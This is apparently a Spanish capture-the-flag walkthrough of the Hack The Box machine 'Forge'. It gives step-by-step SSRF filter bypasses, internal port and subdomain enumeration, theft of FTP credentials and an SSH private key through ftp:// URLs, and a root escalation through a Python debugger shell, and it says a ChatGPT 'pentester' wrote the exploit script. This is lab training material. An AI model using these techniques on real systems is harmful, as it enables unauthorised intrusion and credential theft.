PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Añadimos el dominio 'forge.htb' al /etc/hosts

-Nos vamos a /upload y Encontramos la opción:
	-Upload from URL

-Probamos a Poner la Dirección de nuestro Servidor:
	-http://10.10.14.18/
		**"GET / HTTP/1.1" 200 -**
		(Recibimos conexión!!)

-Intentamos Ejecutar Comandos a través de un archivo con Código php pero no lo Interpreta.

-Probamos un SSRF

## SSRF 

-Upload from url: http://localhost
	 **URL contains a blacklisted address!**

-Parece que se está aplicando un Filtro, vamos a Saltarlo.
	-Lo podemos Bypassear con:
		-http://loCalhost
		-http://127.1

### Internal Port Discovery

-Enumeramos **Posibles Puertos Internos Abiertos**:
	-Primero probamos con uno que sabemos que está abierto para ver la Respuesta:
		-http://127.1:22
			# **An error occured! Error : ('Connection aborted.', BadStatusLine('SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n'))**
	-http://127.1:20
		**An error occured! Error : Connection Refused**
		(Si nos sale **este Error** es que **el Puerto No está Abierto**)
	-http://127.1:21
		# **An error occured! Error : ('Connection aborted.', BadStatusLine("220 Forge's internal ftp server\r\n"))**
		(**Puerto 21 Descubierto!!!** , Parece que este Puerto **SI está Abierto Internamente**)

**-NOTA:**  También lo podemos Descubrir Enviando la Petición al Intruder y Fuzzeando los puertos, en los que salga la frase 'Connection aborted' en la Respuesta es que están Abiertos

-Esto no nos lleva a ningún sitio.

-Hacemos **Fuzzing de Subdominios:**
	-wfuzz -c --hl=9 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.forge.htb" http://forge.htb
		**admin.forge.htb**

-Si accedemos desde el Navegador nos dice a **'admin.forge.htb'**:
	**Only localhost is allowed!**

-Accedemos a **'admin.forge.htb'** desde el **SSRF**:
	POST /upload
	url=http://admin.Forge.htb&remote=1
	(Ponemos la F en Mayúscula para Bypassear el Filtro!!)
		-Nos Guarda el Contenido aquí:
			http://forge.htb/uploads/PpGwsTIwZf7uB86l855B

-Hacemos un Curl para ver el Contenido:
	-curl -s -X GET "http://forge.htb/uploads/PpGwsTIwZf7uB86l855B"
		Admin Portal
		href="/announcements">Announcements
			**-Estamos viendo el Contenido de un Portal de Admins!!**

-Hacemos un Curl para ver el Contenido de 'admin.forge.htb/announcements':
	-curl -s -X GET "http://forge.htb/uploads/MPxoWBpo7IKa7DHx4NRL"
		**user:heightofsecurity123!**
		**(Son Credenciales de FTP!!)**

-NOTA: Con **html2text** se ve más bonito el Output:
	-curl -s -X GET "http://forge.htb/uploads/MPxoWBpo7IKa7DHx4NRL" |  html2text

--------------------------------------------------------------------

-Nos podemos conectarnos por FTP ya que el puerto solo está abierto Internamente, tampoco nos deja conectarnos por SSH

-Hacemos Petición desde el SSRF a /announcements:
	url=http://admin.Forge.htb/upload&remote=1
		-Nos genera:
			http://forge.htb/uploads/q0VotuoKOKaFNmQ3tqqk

-Volvemos a ver su contenido en busca de más información:
	-curl -s -X GET "http://forge.htb/uploads/q0VotuoKOKaFNmQ3tqqk" | html2text
		The /upload endpoint now supports ftp, ftps, http and https protocols for
	      uploading from url.
	    The /upload endpoint has been configured for easy scripting of uploads,
	      and for uploading an image, one can simply pass a url with ?u=url

-Descubrimos que con el Parámetro '?u' , podemos especificarle una URL, y podemos usar los Métodos HTTP,HTTPS,FTP,FTPS

-Aprovechamos el **SSRF**, para apuntar a **/upload** y **Autenticarnos con el Protocolo FTP y las Credenciales Obtenidas:**
	-url=http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb
		-Nos Genera --> http://forge.htb/uploads/d11bYXBUBgLFxQFA90Li

-Vemos su Conenido con Curl:
	-curl -s -X GET "http://forge.htb/uploads/d11bYXBUBgLFxQFA90Li"
		**-rw-r-----    1 0        1000           33 Jun 16 16:31 user.txt**
		(Estamos viendo el Contenido del Servicio FTP de la Máquina!!)
	**-NOTA:** También funciona con --> ftp://user:heightofsecurity123!@10.10.11.111

-Para ver la Flag:
	-url=http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@10.10.11.111/user.txt
	-Vemos su contenido con Curl:
		-curl -s -X GET "http://forge.htb/uploads/1LZNwXO8RZltdO8AtJBr"
			b576be094ca7f6dd0cad2b91fb1ae97d

-Probamos a Listar la Clave Privada de SSH del usuario:
	-url=http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@10.10.11.111/.ssh/id_rsat
	-Vemos su Contenido con Curl:
		-curl -s -X GET "http://forge.htb/uploads/Lw5cIoZ1qcCbHQ0DAR16"
			**VEMOS LA ID_RSA!!**

-Nos conectamos por ssh con la Clave Privada Obtenida:
	-Le damos los permisos necesarios:
		-chmod 600 id_rsa 
	-Nos autenticamos:
		-ssh -i id_rsa user@10.10.11.111
			**user@forge:~$ whoami**
				**user**

## Escalada de Privilegios

-sudo -l:
	**(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py**

-El Script nos Genera un número ramdom y si enviamos el mensaje **'secretadminpassword'**, desde un Script de Python, nos deja Elegir varias Opciones para Ejecutar un comando.

-La vulnerabilidad está en:
	**pdb.post_mortem(e.traceback)**
	(Significa que si ocurre una Excepción, se activa el Debugger, y ya desde ahí podemos Spawnear una Bash como root)

-Le pasamos el Script al GPT Pentester de Chat gpt y nos genera el siguente script para generar la Excepción en el Script **'/opt/remote-manage.py'**

-Tenemos que tener 2 sesiones de SSH abiertas en la Víctima:
	-Ejecutamos el Script como root:
		-sudo python3 /opt/remote-manage.py
			**Listening on Port 12340**
	-Desde la otra ventana, Modificamos el Script de CharGPT y ponemos el Puerto 12340, después lo Ejecutamos:
		-python3 root.py
	-Al Ejecutarlo el Script de ChatGPT, el Script '/opt/remote-manage.py' salta el Debugger, Spawneamos una Shell como root de la siguiente manera:
		**(Pdb) import os; os.system("/bin/bash")**
		**root@forge:/tmp# whoami**
			**root**